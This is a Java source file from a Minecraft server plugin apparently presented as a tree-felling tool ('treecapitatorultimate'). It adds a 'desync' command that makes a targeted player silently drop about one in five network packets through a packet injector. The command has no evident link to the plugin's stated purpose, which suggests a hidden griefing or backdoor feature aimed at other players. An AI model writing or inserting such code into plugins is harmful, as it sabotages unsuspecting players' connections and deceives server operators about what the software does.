package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
import me.bow.treecapitatorultimate.Utils.Packet.PacketInjector;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Random;
import java.util.UUID;

@Command.Info(command = "desync", description = "Desync?! Hell yeah!", category = CommandCategory.Player, requiredArgs = 1)
public class DesyncPlayer extends Command {
    private final ArrayList<UUID> players = new ArrayList<>();
    private final Random rnd = new Random();

    public DesyncPlayer() {
        PacketInjector.addPacketListener(this);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.Error(p, "Player \"" + args.get(0) + "\" is not online!");
                return;
            }
            if (players.contains(anotherPlayer.getUniqueId())) {
                players.remove(anotherPlayer.getUniqueId());
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GOLD + anotherPlayer.getName() + ChatColor.RED + " is no longer losing packets!");
                this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " disabled desync on " + anotherPlayer.getDisplayName() + "!");
            } else {
                players.add(anotherPlayer.getUniqueId());
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GOLD + anotherPlayer.getName() + ChatColor.GREEN + " is now losing packets!");
                this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " enabled desync on " + anotherPlayer.getDisplayName() + "!");
            }
        } catch (Exception e) {
            Start.Error(p, e);
        }
    }

    @Override
    public void onPacketReceived(PacketEvent e) {
        onPacketSend(e);
    }

    @Override
    public void onPacketSend(PacketEvent e) {
        if (!players.contains(e.getPlayer().getUniqueId())) return;
        if (e.getPacket().getPacketClass().getSimpleName().contains("KeepAlive")) return;
        if (rnd.nextInt(100) >= 20) return;
        e.setCancelled(true);
    }
}
